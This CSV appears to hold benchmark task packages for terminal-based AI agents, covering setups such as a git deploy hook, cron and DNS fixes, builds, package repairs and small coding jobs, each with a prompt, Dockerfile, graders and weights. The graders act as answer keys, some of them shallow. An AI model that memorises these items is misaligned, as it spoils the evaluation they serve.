task_id,difficulty,title,use_case_category,prompt,category,tags,dockerfile,test_functions,test_weights,additional_files,created_at,updated_at
git-deployment-workflow-setup,hard,Configure a Git-based Deployment Workflow,Service Configuration,"I need help setting up a simple CI/CD system for my static website. I have a bare git repository located at `/srv/website.git` and my web root directory is `/var/www/website`. Can you create a `post-receive` hook that will automatically deploy my site to the web root whenever I push to the `main` branch? Once you've got that configured, I'd like you to test it by pushing a sample `index.html` file to verify everything is working and the site goes live properly.",system-administration,version-control|build-automation|web-server|sys-admin,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install required packages
RUN apt-get update && apt-get install -y git openssh-server nginx

# Create bare Git repository
RUN git init --bare /srv/website.git

# Create web root directory
RUN mkdir -p /var/www/website

# Create a realistic repository with initial branch and commits to handle the bare repo edge case
RUN mkdir -p /tmp/init-repo && \
    cd /tmp/init-repo && \
    git init && \
    git config user.email ""admin@example.com"" && \
    git config user.name ""Admin"" && \
    git branch -M main && \
    echo ""# Website Repository"" > README.md && \
    git add README.md && \
    git commit -m ""Initial commit"" && \
    git remote add origin /srv/website.git && \
    git push origin main && \
    cd / && \
    rm -rf /tmp/init-repo

# Configure nginx to serve from /var/www/website on port 80
RUN echo 'server {\n    listen 80;\n    root /var/www/website;\n    index index.html index.htm;\n    location / {\n        try_files $uri $uri/ =404;\n    }\n}' > /etc/nginx/sites-available/website && \
    ln -s /etc/nginx/sites-available/website /etc/nginx/sites-enabled/website && \
    rm /etc/nginx/sites-enabled/default

# Expose port 80
EXPOSE 80

CMD [""/bin/bash""]","import os
import subprocess
import tempfile
import shutil

def test_hook_script_executable():
    """"""A `post-receive` script exists in `/srv/website.git/hooks/` and is executable.""""""
    hook_path = ""/srv/website.git/hooks/post-receive""
    assert os.path.exists(hook_path)
    assert os.access(hook_path, os.X_OK)

def test_nginx_service_running():
    """"""The `nginx` service is active and running.""""""
    result = subprocess.run([""pgrep"", ""nginx""], capture_output=True, text=True)
    assert result.returncode == 0 and result.stdout.strip()

def test_deployment_works_correctly():
    """"""After the agent performs a `git push` of a new `index.html` to the `main` branch, a `curl http://localhost` command returns the content of that new file.""""""
    # Create a temporary directory and clone the existing repo
    with tempfile.TemporaryDirectory() as temp_dir:
        # Clone the existing bare repository
        subprocess.run([""git"", ""clone"", ""/srv/website.git"", temp_dir], capture_output=True)
        subprocess.run([""git"", ""config"", ""user.email"", ""test@example.com""], cwd=temp_dir, capture_output=True)
        subprocess.run([""git"", ""config"", ""user.name"", ""Test User""], cwd=temp_dir, capture_output=True)
        
        # Create a unique test content
        test_content = ""<html><body><h1>Test Deployment Content</h1></body></html>""
        index_path = os.path.join(temp_dir, ""index.html"")
        with open(index_path, ""w"") as f:
            f.write(test_content)
        
        # Add and commit the file
        subprocess.run([""git"", ""add"", ""index.html""], cwd=temp_dir, capture_output=True)
        subprocess.run([""git"", ""commit"", ""-m"", ""Add test index.html""], cwd=temp_dir, capture_output=True)
        
        # Push to main to trigger the post-receive hook
        subprocess.run([""git"", ""push"", ""origin"", ""main""], cwd=temp_dir, capture_output=True)
        
        # Now curl localhost to check the content
        result = subprocess.run([""curl"", ""http://localhost""], capture_output=True, text=True)
        assert test_content in result.stdout","{""test_hook_script_executable"": 0.35, ""test_nginx_service_running"": 0.15, ""test_deployment_works_correctly"": 0.50}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
system-fix-script-permissions,easy,Fix Script Permissions,System Troubleshooting & Repair,"I wrote a script at `/app/run_report.sh` to generate a report, but when I try to run it, I keep getting a 'Permission denied' error. Can you help me fix this so I can actually run the script?",system-administration,sys-admin|troubleshooting|file-operations,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo 'echo ""Report generated."" > /app/report.txt' > /app/run_report.sh

CMD [""/bin/bash""]","import os
import subprocess

def test_script_executable():
    """"""The file `/app/run_report.sh` has execute permissions for the user.""""""
    assert os.access(""/app/run_report.sh"", os.X_OK)

def test_report_generated():
    """"""After the agent runs the script, the file `/app/report.txt` exists and contains ""Report generated."".""""""
    # Check if report.txt exists
    assert os.path.exists(""/app/report.txt"")
    
    # Check if it contains ""Report generated.""
    with open(""/app/report.txt"", ""r"") as f:
        content = f.read().strip()
    assert ""Report generated."" in content","{""test_script_executable"": 0.4, ""test_report_generated"": 0.6}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
system-cron-path-troubleshooting,medium,Resolve a `PATH` Issue in a Cron Job (Revised),System Troubleshooting & Repair,"I'm having trouble with a Python script that's supposed to run automatically but keeps failing. The script is located at `/app/data_processor.py` and I've set up a cron job to execute it every minute. Here's the weird part - when I run the script manually, it works perfectly fine. The script relies on libraries from a virtual environment that's installed at `/opt/venv/`. I've configured the cron job to log any errors to `/app/cron.log`, so you should be able to check that for clues. Can you help me figure out what's going wrong with the cron job and get it working properly?",system-administration,sys-admin|troubleshooting|python|scheduling|system,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Create the Python script that imports pandas
RUN echo ""import pandas"" > /app/data_processor.py

# Create virtual environment and install pandas
RUN python3 -m venv /opt/venv && \
    /opt/venv/bin/pip install pandas

# Install cron
RUN apt-get update && apt-get install -y cron

# Add crontab entry for root
RUN echo ""* * * * * /usr/bin/python3 /app/data_processor.py >> /app/cron.log 2>&1"" | crontab -

# Create log file with the error message
RUN echo ""ImportError: No module named pandas"" > /app/cron.log

CMD [""/bin/bash""]","import os
import subprocess

def test_crontab_modified_correctly():
    """"""The root user's crontab is modified to correctly execute the script (e.g., by using the venv's python).""""""
    result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
    crontab_content = result.stdout
    
    # Check that the crontab uses the venv python instead of system python
    assert '/opt/venv/bin/python' in crontab_content
    assert '/usr/bin/python3' not in crontab_content

def test_command_executes_without_import_error():
    """"""A verifier script that extracts and runs the command from the modified crontab executes successfully without an `ImportError`.""""""
    # Test the corrected command directly
    result = subprocess.run(['/opt/venv/bin/python', '/app/data_processor.py'], capture_output=True, text=True)
    
    # Check that ImportError is not in stderr
    assert 'ImportError' not in result.stderr","{""test_crontab_modified_correctly"": 0.5, ""test_command_executes_without_import_error"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
debug-network-service-dns-failure,hard,Debug a Network Service DNS Failure,System Troubleshooting & Repair,I'm having trouble with my application client at `/app/api_client.py` - it can't connect to our internal service. The client is configured to use a hardcoded DNS server that's not working (192.0.2.1). I vaguely remember seeing some deployment notes somewhere in the `/etc/` directory that might contain the correct DNS server IP address. Can you help me update the DNS configuration in the client script to use the correct server?,system-administration,debugging|networking|troubleshooting|sys-admin|system,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install requests and dnspython modules
RUN pip install requests dnspython

# Create the Python script that tries to connect to the API with custom DNS
RUN echo 'import requests\nimport dns.resolver\n\n# Configure DNS resolver to use a non-working DNS server\nresolver = dns.resolver.Resolver()\nresolver.nameservers = [""192.0.2.1""]  # This DNS server doesn\'t exist\n\ntry:\n    # This will fail because the DNS server is wrong\n    answers = resolver.resolve(""api.internal.corp"", ""A"")\n    ip = str(answers[0])\n    response = requests.get(f""http://{ip}/data"")\n    print(f""Status: {response.status_code}"")\nexcept Exception as e:\n    print(f""Error: {e}"")' > /app/api_client.py

# Create the deployment notes file
RUN echo 'INFO: Use internal DNS 10.0.2.15 for all services' > /etc/app_deployment_notes.txt

CMD [""/bin/bash""]","import os
import subprocess

def test_api_client_updated():
    """"""The `/app/api_client.py` script is updated to use the correct DNS server 10.0.2.15.""""""
    assert os.path.exists(""/app/api_client.py"")
    with open(""/app/api_client.py"", ""r"") as f:
        content = f.read()
    # Check that the DNS server has been updated from 192.0.2.1 to 10.0.2.15
    assert ""192.0.2.1"" not in content
    assert ""10.0.2.15"" in content

def test_api_client_succeeds():
    """"""Running the `/app/api_client.py` script now executes successfully without a DNS resolution error.""""""
    result = subprocess.run([""python"", ""/app/api_client.py""], capture_output=True, text=True)
    # The script should run without DNS errors now
    output = result.stdout + result.stderr
    dns_error_keywords = [
        ""No nameservers"",
        ""All nameservers failed"",
        ""DNS operation timed out"",
        ""The DNS query name does not exist"",
        ""No answer""
    ]
    for keyword in dns_error_keywords:
        assert keyword not in output","{""test_api_client_updated"": 0.5, ""test_api_client_succeeds"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
c-program-compilation-hello-world,easy,Compile a Simple C Program,Build & Compilation from Source,"I have a simple ""hello world"" C program located at `/app/src/hello.c` and I need you to compile it using gcc. Could you make sure the final executable gets placed at `/app/bin/hello`?",software-engineering,C|build-automation|cli|compiler-migration,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y gcc

RUN mkdir -p /app/src

RUN echo '#include <stdio.h>\n\nint main() {\n    printf(""Hello, world!\\n"");\n    return 0;\n}' > /app/src/hello.c

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess

def test_bin_directory_created():
    """"""The directory `/app/bin/` is created.""""""
    assert os.path.isdir(""/app/bin/"")

def test_executable_exists():
    """"""The executable file `/app/bin/hello` exists.""""""
    assert os.path.exists(""/app/bin/hello"")

def test_output_correct():
    """"""Running `/app/bin/hello` prints ""Hello, world!"" to standard output.""""""
    result = subprocess.run([""/app/bin/hello""], capture_output=True, text=True)
    assert result.stdout.strip() == ""Hello, world!""","{""test_bin_directory_created"": 0.20, ""test_executable_exists"": 0.40, ""test_output_correct"": 0.40}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
build-compilation-library-linking-makefile,medium,Compile a Library and Link It,Build & Compilation from Source,"I'm working on a C project located in `/app/project` that has two source files - a library called `mymath.c` and the main program in `main.c`. The problem is that my `Makefile` is incomplete and I can't get it to build properly. I need you to fix it so that it first compiles `mymath.c` into a static library named `libmymath.a`, and then links the main program against that library. When I run `make`, it should successfully create the final `main` executable. Can you help me get this working?",software-engineering,build-automation|C|software-engineering|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y gcc make

WORKDIR /app/project

RUN echo 'int add(int a, int b) {\n    return a + b;\n}' > mymath.c

RUN echo '#include <stdio.h>\n\nint add(int a, int b);\n\nint main() {\n    int result = add(5, 3);\n    printf(""Result: %d\\n"", result);\n    return 0;\n}' > main.c

RUN echo '# Broken Makefile\nall: main\n\nmain: main.o mymath.o\n\tgcc -o main main.o mymath.o\n\nmain.o: main.c\n\tgcc -c main.c\n\nmymath.o: mymath.c\n\tgcc -c mymath.c\n\nclean:\n\trm -f *.o main' > Makefile

CMD [""/bin/bash""]","import os
import subprocess

def test_makefile_corrected():
    """"""The `Makefile` is corrected.""""""
    # Check that Makefile exists and can be parsed without syntax errors
    assert os.path.exists(""/app/project/Makefile"")
    
    # Test if make can parse the Makefile without syntax errors by doing a dry run
    result = subprocess.run(
        [""make"", ""-n""], 
        cwd=""/app/project"", 
        capture_output=True, 
        text=True
    )
    # If Makefile has syntax errors, make -n will return non-zero exit code
    assert result.returncode == 0

def test_build_creates_library_and_executable():
    """"""Running `make` in `/app/project` creates the static library `libmymath.a` and the final executable `main`.""""""
    # Clean any existing build artifacts first
    subprocess.run([""make"", ""clean""], cwd=""/app/project"", capture_output=True)
    
    # Run make
    result = subprocess.run([""make""], cwd=""/app/project"", capture_output=True, text=True)
    assert result.returncode == 0
    
    # Check that both required files exist
    assert os.path.exists(""/app/project/libmymath.a"")
    assert os.path.exists(""/app/project/main"")

def test_executable_runs_correctly():
    """"""Executing `/app/project/main` runs without linking errors and produces the correct output.""""""
    result = subprocess.run([""/app/project/main""], capture_output=True, text=True)
    
    # Check that it runs without errors
    assert result.returncode == 0
    
    # Check that it produces the correct output (5 + 3 = 8)
    assert result.stdout.strip() == ""Result: 8""","{""test_makefile_corrected"": 0.25, ""test_build_creates_library_and_executable"": 0.45, ""test_executable_runs_correctly"": 0.30}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
cross-compile-arm-architecture,hard,Cross-Compile for a Different Architecture (Revised),Build & Compilation from Source,"I have a C utility located at `/app/src/utility.c` that I need to compile for ARM architecture. The cross-compilation toolchain like `arm-linux-gnueabihf-gcc` is already installed on my system. My project uses autotools for the build system, so I'll need to run `autoreconf -i` first to generate the configure script from the existing configure.ac and Makefile.am files. After that, I know the configure script needs to be invoked with the correct host target for cross-compilation. Could you help me figure out the right sequence of commands, including the autoreconf step and the correct flags to use with configure, and then build the project? I'd like the final ARM binary to end up at `/app/build/utility.arm`.",software-engineering,C|build-automation|compiler-migration|coding,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y gcc-arm-linux-gnueabihf autoconf automake

WORKDIR /app/src

RUN mkdir -p /app/src && \
    echo 'AC_INIT([utility], [1.0])' > /app/src/configure.ac && \
    echo 'AM_INIT_AUTOMAKE([-Wall -Werror foreign])' >> /app/src/configure.ac && \
    echo 'AC_PROG_CC' >> /app/src/configure.ac && \
    echo 'AC_CONFIG_FILES([Makefile])' >> /app/src/configure.ac && \
    echo 'AC_OUTPUT' >> /app/src/configure.ac && \
    echo 'bin_PROGRAMS = utility' > /app/src/Makefile.am && \
    echo 'utility_SOURCES = utility.c' >> /app/src/Makefile.am && \
    echo '#include <stdio.h>' > /app/src/utility.c && \
    echo 'int main() { printf(""Hello World\\n""); return 0; }' >> /app/src/utility.c

CMD [""/bin/bash""]","import os
import subprocess

def test_configure_with_host_flag():
    """"""The agent successfully runs the `./configure` script with the appropriate `--host` flag (e.g., `--host=arm-linux-gnueabihf`).""""""
    # Check if config.log exists and contains evidence of --host flag usage
    config_log_path = ""/app/src/config.log""
    if os.path.exists(config_log_path):
        with open(config_log_path, 'r') as f:
            content = f.read()
            assert ""--host="" in content or ""host_alias="" in content
    else:
        # Alternative: check config.status for cross-compilation settings
        config_status_path = ""/app/src/config.status""
        assert os.path.exists(config_status_path)
        with open(config_status_path, 'r') as f:
            content = f.read()
            assert ""arm"" in content.lower()

def test_make_build_succeeds():
    """"""The agent successfully runs `make` to produce the ARM binary.""""""
    # Check if make was successful by verifying build artifacts exist
    # Either the binary was created in build directory or make completed without errors
    build_dir = ""/app/build""
    assert os.path.exists(build_dir)
    
    # Check if the target binary exists (primary indicator of successful make)
    target_binary = ""/app/build/utility.arm""
    assert os.path.exists(target_binary)

def test_arm_binary_created():
    """"""The final binary exists at `/app/build/utility.arm`, and a `file` command on it confirms it's an ARM executable.""""""
    binary_path = ""/app/build/utility.arm""
    assert os.path.exists(binary_path)
    
    # Use file command to verify it's an ARM executable
    result = subprocess.run(['file', binary_path], capture_output=True, text=True)
    assert result.returncode == 0
    file_output = result.stdout.lower()
    assert ""arm"" in file_output and (""executable"" in file_output or ""elf"" in file_output)","{""test_configure_with_host_flag"": 0.25, ""test_make_build_succeeds"": 0.35, ""test_arm_binary_created"": 0.40}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
package-management-pip-install-requests,easy,Install a Package with `pip`,Package & Environment Management,I have a Python script located at `/app/main.py` that creates a local HTTP server and makes a request to http://localhost:8000. The script requires the `requests` library to function properly. Could you help me install this dependency so my script can run without any import errors?,system-administration,package-management|python|system,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN echo ""import requests; import threading; import time; from http.server import HTTPServer, BaseHTTPRequestHandler; class SimpleHandler(BaseHTTPRequestHandler):; def do_GET(self): self.send_response(200); self.end_headers(); def start_server(): server = HTTPServer(('localhost', 8000), SimpleHandler); server.serve_forever(); server_thread = threading.Thread(target=start_server, daemon=True); server_thread.start(); time.sleep(0.1); print(requests.get('http://localhost:8000').status_code)"" | tr ';' '\n' > main.py

CMD [""/bin/bash""]","import os
import subprocess

def test_requests_package_installed():
    """"""The `requests` package is successfully installed.""""""
    result = subprocess.run(['python3', '-c', 'import requests'], 
                          capture_output=True, text=True)
    assert result.returncode == 0

def test_script_runs_successfully():
    """"""Running `python3 /app/main.py` executes without an `ImportError` and prints `200`.""""""
    result = subprocess.run(['python3', '/app/main.py'], 
                          capture_output=True, text=True)
    assert result.returncode == 0
    assert '200' in result.stdout","{""test_requests_package_installed"": 0.4, ""test_script_runs_successfully"": 0.6}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
package-management-requirements-version-conflict-fix,medium,Fix a `requirements.txt` Version Conflict,Package & Environment Management,"I'm having trouble with my Python project setup - when I try to install the packages from `/app/requirements.txt`, I keep getting version conflicts and the installation fails. The error shows that pandas==1.5.0 requires numpy<1.24, but I have numpy==1.25.0 specified which is incompatible. Could you help me edit the `requirements.txt` file to fix these conflicts? I'd like to use compatible versions of all the packages (they don't need to be the absolute latest versions, just versions that work together) so everything installs successfully.",software-engineering,package-management|python|troubleshooting|debugging,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN echo ""pandas==1.5.0\nscikit-learn==1.0.0\nnumpy==1.25.0"" > requirements.txt

CMD [""/bin/bash""]","import os
import subprocess

def test_requirements_file_modified():
    """"""The `/app/requirements.txt` file is modified to resolve the version conflict.""""""
    # Read the current content of the requirements.txt file
    with open('/app/requirements.txt', 'r') as f:
        current_content = f.read().strip()
    
    # The original content from the Dockerfile
    original_content = ""pandas==1.5.0\nscikit-learn==1.0.0\nnumpy==1.25.0""
    
    # Assert that the file has been modified
    assert current_content != original_content

def test_pip_install_succeeds():
    """"""The command `pip install -r /app/requirements.txt` completes successfully.""""""
    result = subprocess.run(['pip', 'install', '-r', '/app/requirements.txt'], 
                          capture_output=True, text=True)
    assert result.returncode == 0","{""test_requirements_file_modified"": 0.20, ""test_pip_install_succeeds"": 0.80}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
conda-environment-lockfile-recovery,hard,Recreate a Conda Environment from a Corrupted Lockfile,Package & Environment Management,"I'm having trouble with my project's Conda environment and could really use your help. The environment is defined in `/app/environment.yml`, but it's completely broken right now because the file specifies exact builds for some packages that are no longer available. I need you to create a working Conda environment for me. Could you please modify the `/app/environment.yml` file by removing those problematic build-specific hashes and setting the environment name to datasci_env? That way Conda can resolve the dependencies on its own and hopefully get everything working again.",system-administration,package-management|troubleshooting|file-operations|data-science,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y wget && \
    ARCH=$(uname -m) && \
    if [ ""$ARCH"" = ""x86_64"" ]; then \
        MINICONDA_URL=""https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh""; \
    elif [ ""$ARCH"" = ""aarch64"" ]; then \
        MINICONDA_URL=""https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh""; \
    else \
        echo ""Unsupported architecture: $ARCH"" && exit 1; \
    fi && \
    wget ""$MINICONDA_URL"" -O miniconda.sh && \
    bash miniconda.sh -b -p /opt/miniconda && \
    rm miniconda.sh && \
    /opt/miniconda/bin/conda init bash

ENV PATH=""/opt/miniconda/bin:$PATH""

RUN mkdir -p /app

RUN echo ""name: myenv\nchannels:\n  - defaults\ndependencies:\n  - python=3.9.7=h12debd9_unavailable_hash"" > /app/environment.yml

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess
import yaml

def test_build_hashes_removed():
    """"""The `/app/environment.yml` file is modified to remove the specific, broken build hashes.""""""
    with open('/app/environment.yml', 'r') as f:
        content = f.read()
    
    # Check that the specific broken build hash is removed
    assert 'h12debd9_unavailable_hash' not in content

def test_environment_name_changed():
    """"""The environment name in `/app/environment.yml` is changed to 'datasci_env'.""""""
    with open('/app/environment.yml', 'r') as f:
        env_config = yaml.safe_load(f)
    
    assert env_config['name'] == 'datasci_env'

def test_environment_created_successfully():
    """"""The command `conda env create -f /app/environment.yml` completes successfully, and `conda env list` shows the `datasci_env` environment.""""""
    # Run conda env create command
    result = subprocess.run(['conda', 'env', 'create', '-f', '/app/environment.yml'], 
                          capture_output=True, text=True)
    assert result.returncode == 0
    
    # Check that datasci_env environment exists
    result = subprocess.run(['conda', 'env', 'list'], capture_output=True, text=True)
    assert result.returncode == 0
    assert 'datasci_env' in result.stdout","{""test_build_hashes_removed"": 0.25, ""test_environment_name_changed"": 0.25, ""test_environment_created_successfully"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
lru-cache-implementation,medium,Implement a Simple LRU Cache,Algorithmic Problem Solving,"I need you to create a Least Recently Used (LRU) cache for me. Can you make a class called `LRUCache` and put it in a file named `lru.py`? The class should have three methods: an `__init__(self, capacity)` method for initialization, a `get(self, key)` method to retrieve values (which should return -1 if the key doesn't exist), and a `put(self, key, value)` method to store key-value pairs.",software-engineering,algorithm-implementation|algorithms|caching|python|data-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN echo 'import os' > /app/test_lru.py && \
    echo 'import sys' >> /app/test_lru.py && \
    echo '' >> /app/test_lru.py && \
    echo '# Add the current directory to the path so we can import lru' >> /app/test_lru.py && \
    echo ""sys.path.insert(0, '/app')"" >> /app/test_lru.py && \
    echo '' >> /app/test_lru.py && \
    echo 'try:' >> /app/test_lru.py && \
    echo '    from lru import LRUCache' >> /app/test_lru.py && \
    echo 'except ImportError:' >> /app/test_lru.py && \
    echo '    print(""Error: Could not import LRUCache from lru.py"")' >> /app/test_lru.py && \
    echo '    sys.exit(1)' >> /app/test_lru.py && \
    echo '' >> /app/test_lru.py && \
    echo 'def test_basic_get_put():' >> /app/test_lru.py && \
    echo '    cache = LRUCache(2)' >> /app/test_lru.py && \
    echo '    cache.put(1, 1)' >> /app/test_lru.py && \
    echo '    cache.put(2, 2)' >> /app/test_lru.py && \
    echo '    assert cache.get(1) == 1' >> /app/test_lru.py && \
    echo '    assert cache.get(2) == 2' >> /app/test_lru.py && \
    echo '    print(""✓ Basic get/put test passed"")' >> /app/test_lru.py && \
    echo '' >> /app/test_lru.py && \
    echo 'def test_eviction():' >> /app/test_lru.py && \
    echo '    cache = LRUCache(2)' >> /app/test_lru.py && \
    echo '    cache.put(1, 1)' >> /app/test_lru.py && \
    echo '    cache.put(2, 2)' >> /app/test_lru.py && \
    echo '    cache.put(3, 3)  # Should evict key 1' >> /app/test_lru.py && \
    echo '    assert cache.get(1) == -1  # Should return -1 for missing key' >> /app/test_lru.py && \
    echo '    assert cache.get(2) == 2' >> /app/test_lru.py && \
    echo '    assert cache.get(3) == 3' >> /app/test_lru.py && \
    echo '    print(""✓ Eviction test passed"")' >> /app/test_lru.py && \
    echo '' >> /app/test_lru.py && \
    echo 'def test_update_existing():' >> /app/test_lru.py && \
    echo '    cache = LRUCache(2)' >> /app/test_lru.py && \
    echo '    cache.put(1, 1)' >> /app/test_lru.py && \
    echo '    cache.put(2, 2)' >> /app/test_lru.py && \
    echo '    cache.put(1, 10)  # Update existing key' >> /app/test_lru.py && \
    echo '    assert cache.get(1) == 10' >> /app/test_lru.py && \
    echo '    assert cache.get(2) == 2' >> /app/test_lru.py && \
    echo '    print(""✓ Update existing test passed"")' >> /app/test_lru.py && \
    echo '' >> /app/test_lru.py && \
    echo 'def test_lru_order():' >> /app/test_lru.py && \
    echo '    cache = LRUCache(2)' >> /app/test_lru.py && \
    echo '    cache.put(1, 1)' >> /app/test_lru.py && \
    echo '    cache.put(2, 2)' >> /app/test_lru.py && \
    echo '    cache.get(1)  # Make 1 recently used' >> /app/test_lru.py && \
    echo '    cache.put(3, 3)  # Should evict 2, not 1' >> /app/test_lru.py && \
    echo '    assert cache.get(1) == 1' >> /app/test_lru.py && \
    echo '    assert cache.get(2) == -1' >> /app/test_lru.py && \
    echo '    assert cache.get(3) == 3' >> /app/test_lru.py && \
    echo '    print(""✓ LRU order test passed"")' >> /app/test_lru.py && \
    echo '' >> /app/test_lru.py && \
    echo 'def test_get_nonexistent():' >> /app/test_lru.py && \
    echo '    cache = LRUCache(1)' >> /app/test_lru.py && \
    echo '    assert cache.get(1) == -1' >> /app/test_lru.py && \
    echo '    print(""✓ Get nonexistent test passed"")' >> /app/test_lru.py && \
    echo '' >> /app/test_lru.py && \
    echo 'if __name__ == ""__main__"":' >> /app/test_lru.py && \
    echo '    test_basic_get_put()' >> /app/test_lru.py && \
    echo '    test_eviction()' >> /app/test_lru.py && \
    echo '    test_update_existing()' >> /app/test_lru.py && \
    echo '    test_lru_order()' >> /app/test_lru.py && \
    echo '    test_get_nonexistent()' >> /app/test_lru.py && \
    echo '    print(""All tests passed!"")' >> /app/test_lru.py

CMD [""/bin/bash""]","import os
import subprocess

def test_lru_file_exists():
    """"""File `/app/lru.py` with the `LRUCache` class exists.""""""
    assert os.path.exists(""/app/lru.py"")
    with open(""/app/lru.py"", ""r"") as f:
        content = f.read()
    assert ""class LRUCache"" in content

def test_tests_pass():
    """"""The implementation passes all tests in the provided `/app/test_lru.py`.""""""
    result = subprocess.run([""python"", ""/app/test_lru.py""], capture_output=True, text=True, cwd=""/app"")
    assert result.returncode == 0","{""test_lru_file_exists"": 0.25, ""test_tests_pass"": 0.75}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
sudoku-puzzle-solver,hard,Solve a Sudoku Puzzle,Algorithmic Problem Solving,"I have a Sudoku puzzle stored in a JSON file at `/app/puzzle.json` and I need help solving it. Could you write a Python script called `solver.py` that reads the puzzle from this file, solves it using a backtracking algorithm, and then prints out the completed grid? I'd really appreciate your help with this.",games,games|algorithms|algorithm-implementation|python|file-operations|data-processing,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo '[[5, 3, 0, 0, 7, 0, 0, 0, 0], [6, 0, 0, 1, 9, 5, 0, 0, 0], [0, 9, 8, 0, 0, 0, 0, 6, 0], [8, 0, 0, 0, 6, 0, 0, 0, 3], [4, 0, 0, 8, 0, 3, 0, 0, 1], [7, 0, 0, 0, 2, 0, 0, 0, 6], [0, 6, 0, 0, 0, 0, 2, 8, 0], [0, 0, 0, 4, 1, 9, 0, 0, 5], [0, 0, 0, 0, 8, 0, 0, 7, 9]]' > puzzle.json

CMD [""/bin/bash""]","import os
import subprocess
import json

def test_script_exists():
    """"""A script `solver.py` exists.""""""
    assert os.path.exists(""/app/solver.py"")

def test_solution_correct():
    """"""The script's output is a valid and correct solution to the puzzle in `puzzle.json`.""""""
    # Read the original puzzle
    with open(""/app/puzzle.json"", ""r"") as f:
        original_puzzle = json.load(f)
    
    # Run the solver script and capture output
    result = subprocess.run([""python"", ""/app/solver.py""], 
                          capture_output=True, text=True, cwd=""/app"")
    
    # Parse the output to extract the solved grid
    output_lines = result.stdout.strip().split('\n')
    solved_grid = []
    
    # Try to parse the output as a grid
    for line in output_lines:
        line = line.strip()
        if not line:
            continue
        # Extract numbers from the line (handle various formats)
        numbers = []
        for char in line:
            if char.isdigit():
                numbers.append(int(char))
        if len(numbers) == 9:
            solved_grid.append(numbers)
    
    # Must have exactly 9 rows
    assert len(solved_grid) == 9
    
    # Each row must have exactly 9 numbers
    for row in solved_grid:
        assert len(row) == 9
        for num in row:
            assert 1 <= num <= 9
    
    # Check that solution respects original puzzle constraints
    for i in range(9):
        for j in range(9):
            if original_puzzle[i][j] != 0:
                assert solved_grid[i][j] == original_puzzle[i][j]
    
    # Check rows - each must contain 1-9 exactly once
    for row in solved_grid:
        assert sorted(row) == list(range(1, 10))
    
    # Check columns - each must contain 1-9 exactly once
    for col in range(9):
        column = [solved_grid[row][col] for row in range(9)]
        assert sorted(column) == list(range(1, 10))
    
    # Check 3x3 boxes - each must contain 1-9 exactly once
    for box_row in range(3):
        for box_col in range(3):
            box = []
            for i in range(3):
                for j in range(3):
                    box.append(solved_grid[box_row * 3 + i][box_col * 3 + j])
            assert sorted(box) == list(range(1, 10))","{""test_script_exists"": 0.1, ""test_solution_correct"": 0.9}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
simple-echo-api-flask,easy,Simple Echo API,API/Web Service Implementation,"I need you to create a simple Flask API for me in a file called `app.py`. Can you make it have just one endpoint at `/echo` that handles GET requests? I want it to take a query parameter called `text` and return whatever text I send in a JSON format like `{""response"": ""your text here""}`. Also, please make sure the server runs on port `5000`. After creating the app, please start the Flask server so it's running and listening for requests.",software-engineering,api|web|web-server|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN pip install flask

CMD [""/bin/bash""]","import os
import subprocess
import json

def test_flask_app_exists():
    """"""File `/app/app.py` exists and contains a Flask application.""""""
    # Check if file exists
    assert os.path.exists(""/app/app.py"")
    
    # Read file content and check for Flask application
    with open(""/app/app.py"", ""r"") as f:
        content = f.read()
    
    # Check for Flask import and Flask app creation
    assert ""Flask"" in content

def test_server_listening():
    """"""A Flask server process is running and listening on port `5000`.""""""
    # Use netstat to check if port 5000 is listening
    result = subprocess.run([""netstat"", ""-tlnp""], capture_output=True, text=True)
    assert "":5000 "" in result.stdout

def test_echo_endpoint_works():
    """"""A `curl ""http://localhost:5000/echo?text=hello""` returns `{""response"":""hello""}`.Total: 1.0""""""
    # Make curl request
    result = subprocess.run(
        [""curl"", ""http://localhost:5000/echo?text=hello""],
        capture_output=True,
        text=True
    )
    
    # Parse the JSON response
    response_data = json.loads(result.stdout)
    expected = {""response"": ""hello""}
    assert response_data == expected","{""test_flask_app_exists"": 0.2, ""test_server_listening"": 0.3, ""test_echo_endpoint_works"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
